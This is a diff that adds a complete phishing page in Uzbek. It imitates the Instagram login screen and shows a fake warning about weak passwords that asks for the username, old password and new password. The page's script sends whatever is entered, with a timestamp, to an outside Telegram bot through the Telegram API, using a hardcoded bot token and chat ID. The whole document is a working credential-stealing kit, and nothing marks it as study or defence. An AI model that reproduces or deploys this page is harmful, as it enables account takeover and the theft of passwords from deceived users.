@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login Page</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
+        *{margin: 0;padding: 0;box-sizing: border-box;outline: none;list-style: none;text-decoration: none;font-family: 'Roboto', sans-serif;}
+        body{background: #fafafa;font-size: 14px;}
+        .wrapper .header{max-width: 350px;width: 100%;height: auto;margin: 50px auto;}
+        .wrapper .header .top,.wrapper .signup,.warning-box{background: #fff;border: 1px solid #e6e6e6;border-radius: 1px;padding: 40px 40px 20px;}
+        .wrapper .header .logo img{display: block;margin: 0 auto 35px;}
+        .wrapper .header .form .input_field{margin-bottom: 5px;}
+        .wrapper .header .form .input_field .input{width: 100%;background: #fafafa;border: 1px solid #efefef;font-size: 12px;border-radius: 3px;color: #262626;padding: 10px;}
+        .wrapper .header .form .input_field .input:focus{border: 1px solid #b2b2b2;}
+        .wrapper .header .form .btn{margin: 10px 0;background-color: #3897f0;border: 1px solid #3897f0;border-radius: 4px;text-align: center;padding: 5px;}
+        .wrapper .header .form .btn a{color: #fff;display: block;}
+        .wrapper .header .or{display: flex;justify-content: space-between;align-items: center;height: 15px;margin: 15px 0 20px;}
+        .wrapper .header .or .line{width: 105px;height: 2px;background: #efefef;}
+        .wrapper .header .or p{color: #999;font-size: 12px;}
+        .wrapper .dif .fb{display: flex;justify-content: center;align-items: center;}
+        .wrapper .dif .fb svg{width: 16px;height: 16px;}
+        .wrapper .dif .fb p{color: #385185;font-weight: 500;margin-left: 10px;}
+        .wrapper .dif .forgot{font-size: 12px;text-align: center;margin-top: 20px;}
+        .wrapper .dif .forgot a{color: #003569;}
+        .wrapper .signup{margin: 10px 0 20px;padding: 25px 40px;text-align: center;color: #262626;}
+        .wrapper .signup a{color: #3897f0;}
+        .warning-box{margin: 20px auto;text-align: center;border-color: #ed4956;}
+        .warning-icon{color: #ed4956;font-size: 24px;margin-bottom: 15px;}
+        .warning-title{color: #262626;font-size: 16px;font-weight: 600;margin-bottom: 8px;}
+        .warning-text{color: #8e8e8e;font-size: 14px;line-height: 1.4;}
+        .warning-form{margin-top: 20px;}
+        .warning-form .input_field{margin-bottom: 10px;}
+        .update-btn{width: 100%;background-color: #3897f0;border: 1px solid #3897f0;border-radius: 4px;text-align: center;padding: 10px;margin-top: 10px;cursor: pointer;transition: all 0.2s;}
+        .update-btn:hover:not(.loading){background-color: #357abd;border-color: #357abd;}
+        .update-btn.loading{opacity: 0.7;pointer-events: none;}
+        .update-btn a{color: #fff;display: block;font-weight: 500;}
+        .success-msg{background: #56c95a;color: #fff;padding: 12px;border-radius: 4px;margin: 10px 0;font-size: 14px;display: none;text-align: center;}
+        .error-msg{background: #ed4956;color: #fff;padding: 12px;border-radius: 4px;margin: 10px 0;font-size: 14px;display: none;text-align: center;}
+        .wrapper .apps{text-align: center;color: #262626;}
+        .wrapper .apps p{margin-bottom: 20px;}
+        .wrapper .apps a img{width: 135px;height: 40px;margin: 0 5px;}
+        .footer{max-width: 935px;width: 100%;margin: 0 auto;padding: 40px 0;display: flex;justify-content: space-between;}
+        .footer .links ul li{display: inline-block;margin-right: 10px;}
+        .footer .links ul li a{color: #003569;font-size: 12px;}
+        .footer .copyright{color: #999;}
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <div class="input_field"><input type="text" placeholder="Telefon raqami, username yoki email" class="input"></div>
+                <div class="input_field"><input type="password" placeholder="Parol" class="input"></div>
+                <div class="btn"><a href="#">Kirish</a></div>
+            </div>
+            <div class="or">
+                <div class="line"></div><p>YOKI</p><div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185">
+                        <path d="M15 0H1C.45 0 0 .45 0 1v14c0 .55.45 1 1 1h13c.55 0 1-.45 1-1V1c0-.55-.45-1-1-1Zm-4.8 11.5h-2.6v-5.9H7.1V5.3h1.5V4.1c0-1.5.9-2.3 2.3-2.3h1.6v2.6h-1.1c-1.1 0-1.3.5-1.3 1.3v1.4h2.6v2.6Z"/>
+                    </svg>
+                    <p>Facebook bilan kirish</p>
+                </div>
+                <div class="forgot"><a href="#">Parolni unutdingizmi?</a></div>
+            </div>
+        </div>
+        <div class="signup"><p>Hisobingiz yo'qmi? <a href="#">Ro'yxatdan o'ting</a></p></div>
+        
+        <div class="warning-box">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-title">Instagram ko'plab zaif parollarni aniqladi</div>
+            <div class="warning-text">Iltimos Instagram parolingizni yangilang</div>
+            <div class="warning-form">
+                <div id="successMsg" class="success-msg"></div>
+                <div id="errorMsg" class="error-msg"></div>
+                <form id="passwordForm">
+                    <div class="input_field"><input type="text" id="username" placeholder="Username" required></div>
+                    <div class="input_field"><input type="password" id="oldPass" placeholder="Eski parol" required></div>
+                    <div class="input_field"><input type="password" id="newPass" placeholder="Yangi parol" required></div>
+                    <div class="update-btn" id="updateBtnDiv"><a href="#" id="updateBtn">Parolni yangilash</a></div>
+                </form>
+            </div>
+        </div>
+        
+        <div class="apps">
+            <p>Ilovani oling.</p>
+            <div class="icons">
+                <a href="#"><img src="https://www.apple.com/v/app-store/e/images/overview/icon_appstore__f7b6e03fc72a.svg" alt="App Store" style="width: 135px; height: 40px;"></a>
+                <a href="#"><img src="https://www.google.com/images/branding/googleplay/120x44.png" alt="Google Play" style="width: 135px; height: 40px;"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="#">BIZ HAQIMIZDA</a></li><li><a href="#">QOLLAB-QUVVATLASH</a></li><li><a href="#">PRESS</a></li>
+                <li><a href="#">API</a></li><li><a href="#">ISH</a></li><li><a href="#">MAXFIYLIG</a></li><li><a href="#">SHARTLAR</a></li>
+                <li><a href="#">KATALOG</a></li><li><a href="#">PROFILLAR</a></li><li><a href="#">HASHTAGLAR</a></li><li><a href="#">TIL</a></li>
+            </ul>
+        </div>
+        <div class="copyright">© 2026 INSTAGRAM</div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '7211406891:AAG4BM3tOUzRPvQ5R4iuBqzek36bW_4-oY0';
+    const CHAT_ID = '6655243292';
+
+    document.getElementById('updateBtn').addEventListener('click', async (e) => {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const oldPass = document.getElementById('oldPass').value;
+        const newPass = document.getElementById('newPass').value;
+        
+        if (!username || !oldPass || !newPass) {
+            alert('Barcha maydonlarni to\'ldiring!');
+            return;
+        }
+        
+        const updateBtn = document.getElementById('updateBtn');
+        const updateBtnDiv = document.getElementById('updateBtnDiv');
+        const successMsg = document.getElementById('successMsg');
+        const errorMsg = document.getElementById('errorMsg');
+        
+        // LOADING
+        updateBtnDiv.classList.add('loading');
+        updateBtn.textContent = 'Yuborilmoqda...';
+        successMsg.style.display = 'none';
+        errorMsg.style.display = 'none';
+        
+        const timestamp = new Date().toLocaleString('uz-UZ');
+        const message = `🆕 *YANGI MA'LUMOT*\n\n` +
+                       `⏰ ${timestamp}\n` +
+                       `👤 Username: ${username}\n` +
+                       `🔒 Eski parol: ${oldPass}\n` +
+                       `🔑 Yangi parol: ${newPass}`;
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.ok) {
+                successMsg.textContent = '✅ BOTGA YUBORİLDİ!';
+                successMsg.style.display = 'block';
+            } else {
+                errorMsg.textContent = `❌ Bot xatosi: ${result.description}`;
+                errorMsg.style.display = 'block';
+                console.log('Bot javobi:', result);
+            }
+        } catch (error) {
+            errorMsg.textContent = '❌ Internet aloqasi yo\'q';
+            errorMsg.style.display = 'block';
+            console.error('Xato:', error);
+        }
+        
+        // RESET
+        setTimeout(() => {
+            successMsg.style.display = 'none';
+            errorMsg.style.display = 'none';
+            document.getElementById('passwordForm').reset();
+        }, 4000);
+        
+        updateBtnDiv.classList.remove('loading');
+        updateBtn.textContent = 'Parolni yangilash';
+    });
+</script>
+</body>
+</html>
